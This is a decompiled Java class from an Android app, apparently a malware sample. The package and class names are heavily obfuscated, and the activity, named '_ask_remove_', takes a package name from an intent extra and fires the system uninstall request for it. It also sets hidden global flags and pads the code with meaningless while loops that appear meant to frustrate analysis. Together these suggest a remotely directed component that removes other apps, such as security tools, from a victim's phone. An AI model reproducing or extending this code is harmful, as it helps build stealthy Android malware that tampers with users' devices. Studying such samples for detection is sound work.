package com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72;
/* loaded from: classes.dex */
public class _ask_remove_ extends Activity {

    /* renamed from: a */
    public static int f116a = 1;

    @Override // android.app.Activity
    protected void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        if (i == f116a && i2 == -1) {
            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f311g = Boolean.FALSE;
        }
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        String str;
        super.onCreate(bundle);
        try {
            try {
                str = getIntent().getStringExtra("key");
            } catch (Exception unused) {
                str = null;
            }
        } catch (Exception unused2) {
            Boolean bool = Boolean.TRUE;
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
        }
        if (str == null) {
            finish();
            return;
        }
        Intent intent = new Intent("android.intent.action.UNINSTALL_PACKAGE");
        intent.setData(Uri.parse("package:" + str));
        intent.putExtra("android.intent.extra.RETURN_RESULT", true);
        hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f311g = Boolean.TRUE;
        hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f317m = Boolean.TRUE;
        startActivityForResult(intent, f116a);
        finish();
    }
}
